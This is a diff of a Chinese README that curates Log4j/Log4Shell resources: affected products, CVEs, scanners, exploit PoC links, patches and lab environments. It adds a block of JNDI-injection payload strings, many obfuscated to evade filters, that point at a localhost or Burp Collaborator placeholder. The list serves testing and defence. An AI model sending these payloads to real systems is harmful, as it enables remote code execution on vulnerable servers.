@@ -1,13 +1,13 @@
-# HackLog4j
+# HackLog4j-永恒之恶龙
 
-本项目用来致敬全宇宙最无敌的Java日志库！同时也记录自己在学习Log4j漏洞过程中遇到的一些内容。本项目会持续更新，本项目创建于2021年12月10日，最近的一次更新时间为2021年12月18日。作者：[0e0w](https://github.com/0e0w/HackLog4j)
+本项目用来致敬全宇宙最无敌的Java日志库！同时也记录自己在学习Log4j漏洞过程中遇到的一些内容。本项目会持续更新，本项目创建于2021年12月10日，最近的一次更新时间为2021年12月19日。作者：[0e0w](https://github.com/0e0w/HackLog4j)
 
 - [01-Log4j基础知识](https://github.com/0e0w/HackLog4j#01-log4j%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86)
 - [02-Log4j框架识别](https://github.com/0e0w/HackLog4j#02-log4j%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB)
 - [03-Log4j上层建筑](https://github.com/0e0w/HackLog4j#03-log4j%E4%B8%8A%E5%B1%82%E5%BB%BA%E7%AD%91)
 - [04-Log4j漏洞汇总](https://github.com/0e0w/HackLog4j#04-log4j%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB)
-- [05-Log4j漏洞检测](https://github.com/0e0w/HackLog4j#05-log4j%E6%BC%8F%E6%A3%80%E6%B5%8B)
-- [06-Log4j漏洞利用](https://github.com/0e0w/HackLog4j#07-log4j%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8)
+- [05-Log4j检测利用](https://github.com/0e0w/HackLog4j#05-log4j%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8)
+- [06-Log4j漏洞修复](https://github.com/0e0w/HackLog4j#06-log4j%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D)
 - [07-Log4j分析文章](https://github.com/0e0w/HackLog4j#07-log4j%E5%88%86%E6%9E%90%E6%96%87%E7%AB%A0)
 - [08-Log4j靶场环境](https://github.com/0e0w/HackLog4j#08-log4j%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)
 
@@ -22,63 +22,117 @@
 
 **log4j + ？ = rce ！**
 
-- Apache Flink
-- Apache Struts2
-- flume
-- dubbo
-- Druid
-- Redis
-- logstash
-- ElasticSearch
-- kafka
-- ghidra
-- Spring-Boot-strater-log4j2
-- 我的世界（Minecraft）
+- [ ] Apache Flink
+- [ ] Apache Struts2
+- [x] Apache Solr
+- [ ] flume
+- [ ] dubbo
+- [ ] Druid
+- [ ] Redis
+- [ ] logstash
+- [ ] ElasticSearch
+- [ ] kafka
+- [ ] ghidra
+- [ ] Spring-Boot-strater-log4j2
+- [ ] VMware vCenter
+- [ ] 我的世界（Minecraft）
 - ......
 - https://github.com/cisagov/log4j-affected-db
-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages
 - https://github.com/YfryTchsGD/Log4jAttackSurface
 - https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes
 - https://github.com/CrackerCat/Log4jAttackSurface
+- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages
 
 ## 04-Log4j漏洞汇总
 
+- CVE-2021-45105
 - CVE-2021-44228
+- CVE-2021-4104
 - CVE-2019-17571
 - CVE-2017-5645
 
-## 05-Log4j漏洞检测
+## 05-Log4j检测利用
+
+如何判断一个网站是否存在Log4j JNDI注入漏洞？如何查找内网中存在Log4j JNDI注入漏洞？
+
+一、Payload
+
+```
+${jndi:rmi://127.0.0.1/poc}
+${jndi:ldap://127.0.0.1/poc}
+${jndi:dns://127.0.0.1/poc}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/poc}
+${${::-j}ndi:rmi://127.0.0.1/poc}
+${${lower:jndi}:${lower:rmi}://127.0.0.1/poc}
+${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://127.0.0.1/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://127.0.0.1/poc}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/poc/}
+${${::-j}ndi:rmi://127.0.0.1/poc/}
+${${lower:jndi}:${lower:rmi}://127.0.0.1/poc/}
+${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1/poc/}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://127.0.0.1/poc/}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://127.0.0.1/poc/}
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}}://127.0.0.1/poc}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/poc}
+$%7Bjndi:ldap://{{burpcollab}}%7D
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}127.0.0.1/poc}
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://127.0.0.1/poc}
+${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1/poc}
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1/poc}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/poc}
+${${env:TEST:-j}ndi${env:TEST:-:}${env:TEST:-l}dap${env:TEST:-:}127.0.0.1/poc}
+${jndi:${lower:l}${lower:d}ap://127.0.0.1/poc}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/poc}
+${jndi:ldap://127.0.0.1#127.0.0.1/poc}
+j${loWer:Nd}i${uPper::}
+```
+
+- https://github.com/fullhunt/log4j-scan
+- https://github.com/test502git/log4j-fuzz-head-poc
+- https://github.com/woodpecker-appstore/log4j-payload-generator
+- https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
+
+二、源码检测
+
+- https://github.com/hupe1980/scan4log4shell
+- https://github.com/logpresso/CVE-2021-44228-Scanner
+- https://github.com/xsultan/log4jshield
+- https://github.com/Joefreedy/Log4j-Windows-Scanner
+- https://github.com/back2root/log4shell-rex
+- https://github.com/Neo23x0/log4shell-detector
+- https://github.com/dwisiswant0/look4jar
+- https://github.com/Qualys/log4jscanwin
+
+三、出网检测
 
 - https://github.com/dorkerdevil/Log-4-JAM
+- https://github.com/adilsoybali/Log4j-RCE-Scanner
 
-## 06-Log4j漏洞利用
+四、不出网检测
 
-- https://github.com/bit4woo/log4jScan
-- https://github.com/Yihsiwei/Log4j-exp
-- https://github.com/FrankHeijden/Log4jFix
-- https://github.com/simonis/Log4jPatch
-- https://github.com/Szczurowsky/Log4j-0Day-Fix
-- https://github.com/Anonymous-ghost/log4jVul
-- https://github.com/SumoLogic/sumologic-log4j2-appender
-- https://github.com/chaitin/log4j2-vaccine
+- https://github.com/For-ACGN/Log4Shell
+- https://github.com/proferosec/log4jScanner
+
+五、主动扫描
+
 - https://github.com/ilsubyeega/log4j2-exploits
-- https://github.com/rz7d/log4j-force-upgrader
-- https://github.com/xsser/log4jdemoforRCE
-- https://github.com/zhangyoufu/log4j2-without-jndi
 - https://github.com/Cyronlee/log4j-rce
-- https://github.com/CreeperHost/Log4jPatcher
-- https://github.com/notrhys/Log-4J-Exploit-Fix
-- https://github.com/Re1own/Apache-log4j-POC
-- https://github.com/boundaryx/cloudrasp-log4j2
-- https://github.com/jas502n/Log4j2-CVE-2021-44228
-- https://github.com/ChloePrime/fix4log4j
-- https://github.com/toString122/log4j2_exp
-- https://github.com/shanfenglan/apache_log4j_poc
-- https://github.com/dbgee/CVE-2021-44228
-- https://github.com/lcosmos/apache-log4j-poc
-- https://github.com/DichuuCraft/LOG4J2-3201-fix
-- https://github.com/dbgee/CVE-2021-44228
-- https://github.com/lcosmos/apache-log4j-poc
+
+六、被动扫描
+
+- https://github.com/silentsignal/burp-log4shell
+- https://github.com/pmiaowu/log4jScan
+- https://github.com/guguyu1/log4j2_burp_scan
+- https://github.com/whwlsfb/Log4j2Scan
+- https://github.com/bigsizeme/Log4j-check
+- https://github.com/f0ng/log4j2burpscanner
+- https://github.com/pmiaowu/log4j2Scan
+- https://github.com/bit4woo/log4jScan
+- https://github.com/izj007/Log4j2Scan
+
+七、其他工具
+
 - https://github.com/DichuuCraft/LOG4J2-3201-fix
 - https://github.com/dbgee/log4j2_rce
 - https://github.com/ReadER-L/log4j-rce
@@ -115,7 +169,6 @@
 - https://github.com/inbug-team/Log4j_RCE_Tool
 - https://github.com/zlepper/CVE-2021-44228-Test-Server
 - https://github.com/webraybtl/Log4j
-- https://github.com/f0ng/log4jscanner
 - https://github.com/numanturle/Log4jNuclei
 - https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
 - https://github.com/kozmer/log4j-shell-poc
@@ -138,28 +191,35 @@
 - https://github.com/KpLi0rn/Log4j2Scan
 - https://github.com/righel/log4shell_nse
 - https://github.com/Ch0pin/log4JFrida
-- https://github.com/back2root/log4shell-rex
+- https://github.com/mycve/HTTPHeaderInjectBrowser
+- https://github.com/ihebski/log4j-Scanner
+- https://github.com/Yihsiwei/Log4j-exp
+- https://github.com/rz7d/log4j-force-upgrader
+- https://github.com/xsser/log4jdemoforRCE
+- https://github.com/e5g/Log-4J-Exploit-Fix
+- https://github.com/Re1own/Apache-log4j-POC
+- https://github.com/jas502n/Log4j2-CVE-2021-44228
+- https://github.com/ChloePrime/fix4log4j
+- https://github.com/toString122/log4j2_exp
+- https://github.com/shanfenglan/apache_log4j_poc
+- https://github.com/dbgee/CVE-2021-44228
+- https://github.com/lcosmos/apache-log4j-poc
+- https://github.com/dbgee/CVE-2021-44228
+- https://github.com/lcosmos/apache-log4j-poc
 
-九、Payload
+## 06-Log4j漏洞修复
 
-- https://github.com/test502git/log4j-fuzz-head-poc
-- https://github.com/fullhunt/log4j-scan
-- https://github.com/woodpecker-appstore/log4j-payload-generator
-- https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
-
-九、BrupSuite
-
-- https://github.com/silentsignal/burp-log4shell
-- https://github.com/pmiaowu/log4jScan
-- https://github.com/guguyu1/log4j2_burp_scan
-- https://github.com/whwlsfb/Log4j2Scan
-- https://github.com/bigsizeme/Log4j-check
-- https://github.com/f0ng/log4j2burpscanner
-- https://github.com/pmiaowu/log4j2Scan
-
-九、漏洞检测
-
-- https://github.com/Neo23x0/log4shell-detector
+- https://github.com/360-CERT/Log4ShellPatch
+- https://github.com/javasec/log4j-patch
+- https://github.com/simonis/Log4jPatch
+- https://github.com/FrankHeijden/Log4jFix
+- https://github.com/Szczurowsky/Log4j-0Day-Fix
+- https://github.com/SumoLogic/sumologic-log4j2-appender
+- https://github.com/chaitin/log4j2-vaccine
+- https://github.com/zhangyoufu/log4j2-without-jndi
+- https://github.com/CreeperHost/Log4jPatcher
+- https://github.com/boundaryx/cloudrasp-log4j2
+- https://github.com/DichuuCraft/LOG4J2-3201-fix
 
 ## 07-Log4j分析文章
 
@@ -182,3 +242,6 @@
 - https://github.com/christophetd/log4shell-vulnerable-app
 - https://github.com/Adikso/minecraft-log4j-honeypot
 - https://github.com/try777-try777/reVul-apache-log4j2-rec
+- https://github.com/EmYiQing/Log4j2DoS
+- https://github.com/tothi/log4shell-vulnerable-app
+- https://github.com/Anonymous-ghost/log4jVul
